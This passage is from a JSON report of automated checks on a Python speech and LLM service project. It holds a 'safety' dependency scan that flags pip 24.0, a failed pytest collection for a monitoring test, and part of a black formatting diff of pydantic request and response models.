\"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pytest-xdist\",\n                    \"specifier\": \"==3.7.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"python-engineio\": {\n            \"name\": \"python-engineio\",\n            \"version\": \"4.12.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"python-engineio==4.12.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"python-engineio\",\n                    \"specifier\": \"==4.12.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"python-socketio\": {\n            \"name\": \"python-socketio\",\n            \"version\": \"5.13.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"python-socketio==5.13.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"python-socketio\",\n                    \"specifier\": \"==5.13.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pyzmq\": {\n            \"name\": \"pyzmq\",\n            \"version\": \"27.0.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pyzmq==27.0.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pyzmq\",\n                    \"specifier\": \"==27.0.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"regex\": {\n            \"name\": \"regex\",\n            \"version\": \"2024.11.6\",\n            \"requirements\": [\n                {\n                    \"raw\": \"regex==2024.11.6\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"regex\",\n                    \"specifier\": \"==2024.11.6\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"requests\": {\n            \"name\": \"requests\",\n            \"version\": \"2.32.4\",\n            \"requirements\": [\n                {\n                    \"raw\": \"requests==2.32.4\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"requests\",\n                    \"specifier\": \"==2.32.4\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"rich\": {\n            \"name\": \"rich\",\n            \"version\": \"14.0.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"rich==14.0.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"rich\",\n                    \"specifier\": \"==14.0.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"ruamel.yaml\": {\n            \"name\": \"ruamel.yaml\",\n            \"version\": \"0.18.14\",\n            \"requirements\": [\n                {\n                    \"raw\": \"ruamel.yaml==0.18.14\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"ruamel.yaml\",\n                    \"specifier\": \"==0.18.14\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"ruamel.yaml.clib\": {\n            \"name\": \"ruamel.yaml.clib\",\n            \"version\": \"0.2.12\",\n            \"requirements\": [\n                {\n                    \"raw\": \"ruamel.yaml.clib==0.2.12\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"ruamel.yaml.clib\",\n                    \"specifier\": \"==0.2.12\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"safety\": {\n            \"name\": \"safety\",\n            \"version\": \"3.5.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"safety==3.5.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"safety\",\n                    \"specifier\": \"==3.5.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"safety-schemas\": {\n            \"name\": \"safety-schemas\",\n            \"version\": \"0.0.14\",\n            \"requirements\": [\n                {\n                    \"raw\": \"safety-schemas==0.0.14\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"safety-schemas\",\n                    \"specifier\": \"==0.0.14\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"setuptools\": {\n            \"name\": \"setuptools\",\n            \"version\": \"80.9.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"setuptools==80.9.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"setuptools\",\n                    \"specifier\": \"==80.9.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"shellingham\": {\n            \"name\": \"shellingham\",\n            \"version\": \"1.5.4\",\n            \"requirements\": [\n                {\n                    \"raw\": \"shellingham==1.5.4\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"shellingham\",\n                    \"specifier\": \"==1.5.4\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"simple-websocket\": {\n            \"name\": \"simple-websocket\",\n            \"version\": \"1.1.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"simple-websocket==1.1.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"simple-websocket\",\n                    \"specifier\": \"==1.1.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"sniffio\": {\n            \"name\": \"sniffio\",\n            \"version\": \"1.3.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"sniffio==1.3.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"sniffio\",\n                    \"specifier\": \"==1.3.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"starlette\": {\n            \"name\": \"starlette\",\n            \"version\": \"0.46.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"starlette==0.46.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"starlette\",\n                    \"specifier\": \"==0.46.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"stevedore\": {\n            \"name\": \"stevedore\",\n            \"version\": \"5.4.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"stevedore==5.4.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"stevedore\",\n                    \"specifier\": \"==5.4.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"tenacity\": {\n            \"name\": \"tenacity\",\n            \"version\": \"9.1.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"tenacity==9.1.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"tenacity\",\n                    \"specifier\": \"==9.1.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"tomlkit\": {\n            \"name\": \"tomlkit\",\n            \"version\": \"0.13.3\",\n            \"requirements\": [\n                {\n                    \"raw\": \"tomlkit==0.13.3\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"tomlkit\",\n                    \"specifier\": \"==0.13.3\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"tqdm\": {\n            \"name\": \"tqdm\",\n            \"version\": \"4.67.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"tqdm==4.67.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"tqdm\",\n                    \"specifier\": \"==4.67.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"typer\": {\n            \"name\": \"typer\",\n            \"version\": \"0.16.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"typer==0.16.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"typer\",\n                    \"specifier\": \"==0.16.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"typing-extensions\": {\n            \"name\": \"typing-extensions\",\n            \"version\": \"4.14.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"typing-extensions==4.14.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"typing-extensions\",\n                    \"specifier\": \"==4.14.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"typing-inspection\": {\n            \"name\": \"typing-inspection\",\n            \"version\": \"0.4.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"typing-inspection==0.4.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"typing-inspection\",\n                    \"specifier\": \"==0.4.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"urllib3\": {\n            \"name\": \"urllib3\",\n            \"version\": \"2.5.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"urllib3==2.5.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"urllib3\",\n                    \"specifier\": \"==2.5.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"websocket-client\": {\n            \"name\": \"websocket-client\",\n            \"version\": \"1.8.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"websocket-client==1.8.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"websocket-client\",\n                    \"specifier\": \"==1.8.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"werkzeug\": {\n            \"name\": \"werkzeug\",\n            \"version\": \"3.1.3\",\n            \"requirements\": [\n                {\n                    \"raw\": \"werkzeug==3.1.3\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"werkzeug\",\n                    \"specifier\": \"==3.1.3\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"wsproto\": {\n            \"name\": \"wsproto\",\n            \"version\": \"1.2.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"wsproto==1.2.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"wsproto\",\n                    \"specifier\": \"==1.2.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"zope.event\": {\n            \"name\": \"zope.event\",\n            \"version\": \"5.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"zope.event==5.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"zope.event\",\n                    \"specifier\": \"==5.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"zope.interface\": {\n            \"name\": \"zope.interface\",\n            \"version\": \"7.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"zope.interface==7.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"zope.interface\",\n                    \"specifier\": \"==7.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"autocommand\": {\n            \"name\": \"autocommand\",\n            \"version\": \"2.2.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"autocommand==2.2.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"autocommand\",\n                    \"specifier\": \"==2.2.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"backports.tarfile\": {\n            \"name\": \"backports.tarfile\",\n            \"version\": \"1.2.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"backports.tarfile==1.2.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"backports.tarfile\",\n                    \"specifier\": \"==1.2.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"importlib-metadata\": {\n            \"name\": \"importlib-metadata\",\n            \"version\": \"8.0.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"importlib-metadata==8.0.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"importlib-metadata\",\n                    \"specifier\": \"==8.0.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"inflect\": {\n            \"name\": \"inflect\",\n            \"version\": \"7.3.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"inflect==7.3.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"inflect\",\n                    \"specifier\": \"==7.3.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"jaraco.collections\": {\n            \"name\": \"jaraco.collections\",\n            \"version\": \"5.1.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"jaraco.collections==5.1.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"jaraco.collections\",\n                    \"specifier\": \"==5.1.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"jaraco.context\": {\n            \"name\": \"jaraco.context\",\n            \"version\": \"5.3.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"jaraco.context==5.3.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"jaraco.context\",\n                    \"specifier\": \"==5.3.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"jaraco.functools\": {\n            \"name\": \"jaraco.functools\",\n            \"version\": \"4.0.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"jaraco.functools==4.0.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"jaraco.functools\",\n                    \"specifier\": \"==4.0.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"jaraco.text\": {\n            \"name\": \"jaraco.text\",\n            \"version\": \"3.12.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"jaraco.text==3.12.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"jaraco.text\",\n                    \"specifier\": \"==3.12.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"more-itertools\": {\n            \"name\": \"more-itertools\",\n            \"version\": \"10.3.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"more-itertools==10.3.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"more-itertools\",\n                    \"specifier\": \"==10.3.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"tomli\": {\n            \"name\": \"tomli\",\n            \"version\": \"2.0.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"tomli==2.0.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"tomli\",\n                    \"specifier\": \"==2.0.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"typeguard\": {\n            \"name\": \"typeguard\",\n            \"version\": \"4.3.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"typeguard==4.3.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"typeguard\",\n                    \"specifier\": \"==4.3.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"wheel\": {\n            \"name\": \"wheel\",\n            \"version\": \"0.45.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"wheel==0.45.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"wheel\",\n                    \"specifier\": \"==0.45.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        },\n        \"zipp\": {\n            \"name\": \"zipp\",\n            \"version\": \"3.19.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"zipp==3.19.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"zipp\",\n                    \"specifier\": \"==3.19.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n                }\n            ]\n        }\n    },\n    \"affected_packages\": {\n        \"pip\": {\n            \"name\": \"pip\",\n            \"version\": \"24.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pip==24.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pip\",\n                    \"specifier\": \"==24.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ],\n            \"found\": null,\n            \"insecure_versions\": [\n                \"0.2\",\n                \"0.2.1\",\n                \"0.3\",\n                \"0.3.1\",\n                \"0.4\",\n                \"0.5\",\n                \"0.5.1\",\n                \"0.6\",\n                \"0.6.1\",\n                \"0.6.2\",\n                \"0.6.3\",\n                \"0.7\",\n                \"0.7.1\",\n                \"0.7.2\",\n                \"0.8\",\n                \"0.8.1\",\n                \"0.8.2\",\n                \"0.8.3\",\n                \"1.0\",\n                \"10.0.0\",\n                \"10.0.0b1\",\n                \"10.0.0b2\",\n                \"10.0.1\",\n                \"1.0.1\",\n                \"1.0.2\",\n                \"1.1\",\n                \"1.2\",\n                \"1.2.1\",\n                \"1.3\",\n                \"1.3.1\",\n                \"1.4\",\n                \"1.4.1\",\n                \"1.5\",\n                \"1.5.1\",\n                \"1.5.2\",\n                \"1.5.3\",\n                \"1.5.4\",\n                \"1.5.5\",\n                \"1.5.6\",\n                \"18.0\",\n                \"18.1\",\n                \"19.0\",\n                \"19.0.1\",\n                \"19.0.2\",\n                \"19.0.3\",\n                \"19.1\",\n                \"19.1.1\",\n                \"19.2\",\n                \"19.2.1\",\n                \"19.2.2\",\n                \"19.2.3\",\n                \"19.3\",\n                \"19.3.1\",\n                \"20.0\",\n                \"20.0.1\",\n                \"20.0.2\",\n                \"20.1\",\n                \"20.1.1\",\n                \"20.1b1\",\n                \"20.2\",\n                \"20.2.1\",\n                \"20.2.2\",\n                \"20.2.3\",\n                \"20.2.4\",\n                \"20.2b1\",\n                \"20.3\",\n                \"20.3.1\",\n                \"20.3.2\",\n                \"20.3.3\",\n                \"20.3.4\",\n                \"20.3b1\",\n                \"21.0\",\n                \"21.0.1\",\n                \"21.1\",\n                \"21.1.1\",\n                \"21.1.2\",\n                \"21.1.3\",\n                \"21.2\",\n                \"21.2.1\",\n                \"21.2.2\",\n                \"21.2.3\",\n                \"21.2.4\",\n                \"21.3\",\n                \"21.3.1\",\n                \"22.0\",\n                \"22.0.1\",\n                \"22.0.2\",\n                \"22.0.3\",\n                \"22.0.4\",\n                \"22.1\",\n                \"22.1.1\",\n                \"22.1.2\",\n                \"22.1b1\",\n                \"22.2\",\n                \"22.2.1\",\n                \"22.2.2\",\n                \"22.3\",\n                \"22.3.1\",\n                \"23.0\",\n                \"23.0.1\",\n                \"23.1\",\n                \"23.1.1\",\n                \"23.1.2\",\n                \"23.2\",\n                \"23.2.1\",\n                \"23.3\",\n                \"23.3.1\",\n                \"23.3.2\",\n                \"24.0\",\n                \"24.1\",\n                \"24.1.1\",\n                \"24.1.2\",\n                \"24.1b1\",\n                \"24.1b2\",\n                \"24.2\",\n                \"24.3\",\n                \"24.3.1\",\n                \"6.0\",\n                \"6.0.1\",\n                \"6.0.2\",\n                \"6.0.3\",\n                \"6.0.4\",\n                \"6.0.5\",\n                \"6.0.6\",\n                \"6.0.7\",\n                \"6.0.8\",\n                \"6.1.0\",\n                \"6.1.1\",\n                \"7.0.0\",\n                \"7.0.1\",\n                \"7.0.2\",\n                \"7.0.3\",\n                \"7.1.0\",\n                \"7.1.1\",\n                \"7.1.2\",\n                \"8.0.0\",\n                \"8.0.1\",\n                \"8.0.2\",\n                \"8.0.3\",\n                \"8.1.0\",\n                \"8.1.1\",\n                \"8.1.2\",\n                \"9.0.0\",\n                \"9.0.1\",\n                \"9.0.2\",\n                \"9.0.3\"\n            ],\n            \"secure_versions\": [\n                \"25.1.1\",\n                \"25.1\",\n                \"25.0.1\",\n                \"25.0\"\n            ],\n            \"latest_version_without_known_vulnerabilities\": \"25.1.1\",\n            \"latest_version\": \"25.1.1\",\n            \"more_info_url\": \"https://data.safetycli.com/p/pypi/pip/97c/\"\n        }\n    },\n    \"announcements\": [],\n    \"vulnerabilities\": [\n        {\n            \"vulnerability_id\": \"75180\",\n            \"package_name\": \"pip\",\n            \"ignored\": {},\n            \"ignored_reason\": null,\n            \"ignored_expires\": null,\n            \"vulnerable_spec\": [\n                \"<25.0\"\n            ],\n            \"all_vulnerable_specs\": [\n                \"<25.0\"\n            ],\n            \"analyzed_version\": \"24.0\",\n            \"analyzed_requirement\": {\n                \"raw\": \"pip==24.0\",\n                \"extras\": [],\n                \"marker\": null,\n                \"name\": \"pip\",\n                \"specifier\": \"==24.0\",\n                \"url\": null,\n                \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n            },\n            \"advisory\": \"Pip solves a security vulnerability that previously allowed maliciously crafted wheel files to execute unauthorized code during installation.\",\n            \"is_transitive\": false,\n            \"published_date\": null,\n            \"fixed_versions\": [],\n            \"closest_versions_without_known_vulnerabilities\": [],\n            \"resources\": [],\n            \"CVE\": null,\n            \"severity\": null,\n            \"affected_versions\": [],\n            \"more_info_url\": \"https://data.safetycli.com/v/75180/97c\"\n        }\n    ],\n    \"ignored_vulnerabilities\": [],\n    \"remediations\": {\n        \"pip\": {\n            \"requirements\": {\n                \"==24.0\": {\n                    \"vulnerabilities_found\": 1,\n                    \"version\": \"24.0\",\n                    \"requirement\": {\n                        \"raw\": \"pip==24.0\",\n                        \"extras\": [],\n                        \"marker\": null,\n                        \"name\": \"pip\",\n                        \"specifier\": \"==24.0\",\n                        \"url\": null,\n                        \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                    },\n                    \"more_info_url\": \"https://data.safetycli.com/p/pypi/pip/97c/\"\n                }\n            },\n            \"current_version\": null,\n            \"vulnerabilities_found\": null,\n            \"recommended_version\": null,\n            \"other_recommended_versions\": [],\n            \"more_info_url\": null\n        }\n    },\n    \"remediations_results\": {\n        \"vulnerabilities_fixed\": [],\n        \"remediations_applied\": {},\n        \"remediations_skipped\": {}\n    }\n}\n\n\n+===========================================================================================================================================================================================+\n\n\nDEPRECATED: this command (`check`) has been DEPRECATED, and will be unsupported beyond 01 June 2024.\n\n\nWe highly encourage switching to the new `scan` command which is easier to use, more powerful, and can be set up to mimic the deprecated command if required.\n\n\n+===========================================================================================================================================================================================+\n\n\n",
      "duration": 0
    },
    "monitoring": {
      "status": "failed",
      "returncode": 2,
      "stdout": "============================= test session starts ==============================\nplatform linux -- Python 3.12.3, pytest-8.4.1, pluggy-1.6.0 -- /home/pas/source/agent-cag/.venv/bin/python\ncachedir: .pytest_cache\nrootdir: /home/pas/source/agent-cag\nconfigfile: pytest.ini\nplugins: cov-6.2.1, xdist-3.7.0, anyio-4.9.0, asyncio-1.0.0\nasyncio: mode=Mode.STRICT, asyncio_default_fixture_loop_scope=None, asyncio_default_test_loop_scope=function\ncollecting ... collected 0 items / 1 error\n\n==================================== ERRORS ====================================\n_____________ ERROR collecting tests/monitoring/test_monitoring.py _____________\ntests/monitoring/test_monitoring.py:11: in <module>\n    with patch('api.main.httpx'), \\\n/usr/lib/python3.12/unittest/mock.py:1442: in __enter__\n    self.target = self.getter()\n                  ^^^^^^^^^^^^^\n/usr/lib/python3.12/pkgutil.py:528: in resolve_name\n    result = getattr(result, p)\n             ^^^^^^^^^^^^^^^^^^\nE   AttributeError: module 'api' has no attribute 'main'\n=========================== short test summary info ============================\nERROR tests/monitoring/test_monitoring.py - AttributeError: module 'api' has ...\n!!!!!!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!!!!!\n=============================== 1 error in 0.59s ===============================\n",
      "stderr": "",
      "duration": 0
    },
    "code_quality": {
      "status": "failed",
      "returncode": 1,
      "results": {
        "black": {
          "status": "failed",
          "output": "--- /home/pas/source/agent-cag/api/__init__.py\t2025-06-20 18:41:33.099182+00:00\n+++ /home/pas/source/agent-cag/api/__init__.py\t2025-06-20 19:24:33.979114+00:00\n@@ -1 +1 @@\n-\"\"\"API Gateway service package.\"\"\"\n\\ No newline at end of file\n+\"\"\"API Gateway service package.\"\"\"\n--- /home/pas/source/agent-cag/asr/__init__.py\t2025-06-20 18:40:43.943907+00:00\n+++ /home/pas/source/agent-cag/asr/__init__.py\t2025-06-20 19:24:33.979129+00:00\n@@ -1 +1 @@\n-\"\"\"ASR (Automatic Speech Recognition) service package.\"\"\"\n\\ No newline at end of file\n+\"\"\"ASR (Automatic Speech Recognition) service package.\"\"\"\n--- /home/pas/source/agent-cag/llm/__init__.py\t2025-06-20 18:41:06.292032+00:00\n+++ /home/pas/source/agent-cag/llm/__init__.py\t2025-06-20 19:24:33.983850+00:00\n@@ -1 +1 @@\n-\"\"\"LLM (Large Language Model) service package.\"\"\"\n\\ No newline at end of file\n+\"\"\"LLM (Large Language Model) service package.\"\"\"\n--- /home/pas/source/agent-cag/api/models.py\t2025-06-20 16:13:35.167066+00:00\n+++ /home/pas/source/agent-cag/api/models.py\t2025-06-20 19:24:34.090960+00:00\n@@ -7,88 +7,111 @@\n from enum import Enum\n \n \n class InputType(str, Enum):\n     \"\"\"Input type enumeration.\"\"\"\n+\n     TEXT = \"text\"\n     SPEECH = \"speech\"\n \n \n class QueryRequest(BaseModel):\n     \"\"\"Request model for query processing.\"\"\"\n+\n     text: str = Field(..., description=\"The query text to process\")\n     user_id: Optional[str] = Field(None, description=\"User identifier\")\n     input_type: InputType = Field(InputType.TEXT, description=\"Type of input\")\n-    generate_speech: bool = Field(False, description=\"Whether to generate speech output\")\n-    use_sardaukar: bool = Field(False, description=\"Whether to use Sardaukar translation for speech\")\n+    generate_speech: bool = Field(\n+        False, description=\"Whether to generate speech output\"\n+    )\n+    use_sardaukar: bool = Field(\n+        False, description=\"Whether to use Sardaukar translation for speech\"\n+    )\n     context: Optional[Dict[str, Any]] = Field(None, description=\"Additional context\")\n \n \n class QueryResponse(BaseModel):\n     \"\"\"Response model for query processing.\"\"\"\n+\n     query_id: str = Field(..., description=\"Unique identifier for the query\")\n     response_id: str = Field(..., description=\"Unique identifier for the response\")\n     text: str = Field(..., description=\"The generated response text\")\n     audio_url: Optional[str] = Field(None, description=\"URL to generated audio file\")\n-    metadata: Dict[str, Any] = Field(default_factory=dict, description=\"Additional metadata\")\n+    metadata: Dict[str, Any] = Field(\n+        default_factory=dict, description=\"Additional metadata\"\n+    )\n \n \n class HealthResponse(BaseModel):\n     \"\"\"Response model for health check.\"\"\"\n+\n     status: str = Field(..., description=\"Service status\")\n     service: str = Field(..., description=\"Service name\")\n     profile: str = Field(..., description=\"Deployment profile\")\n     version: str = Field(..., description=\"Service version\")\n     timestamp: Optional[str] = Field(None, description=\"Health check timestamp\")\n \n \n class TranscriptionRequest(BaseModel):\n     \"\"\"Request model for speech transcription.\"\"\"\n+\n     audio_data: bytes = Field(..., description=\"Audio data to transcribe\")\n     format: str = Field(\"wav\", description=\"Audio format\")\n     language: Optional[str] = Field(\"en\", description=\"Language code\")\n \n \n class TranscriptionResponse(BaseModel):\n     \"\"\"Response model for speech transcription.\"\"\"\n+\n     text: str = Field(..., description=\"Transcribed text\")\n     confidence: Optional[float] = Field(None, description=\"Transcription confidence\")\n     language: Optional[str] = Field(None, description=\"Detected language\")\n \n \n class SynthesisRequest(BaseModel):\n     \"\"\"Request model for speech synthesis.\"\"\"\n+\n     text: str = Field(..., description=\"Text to synthesize\")\n     voice: Optional[str] = Field(None, description=\"Voice to use\")\n-    use_sardaukar: bool = Field(False, description=\"Whether to translate to Sardaukar first\")\n+    use_sardaukar: bool = Field(\n+        False, description=\"Whether to translate to Sardaukar first\"\n+    )\n \n \n class 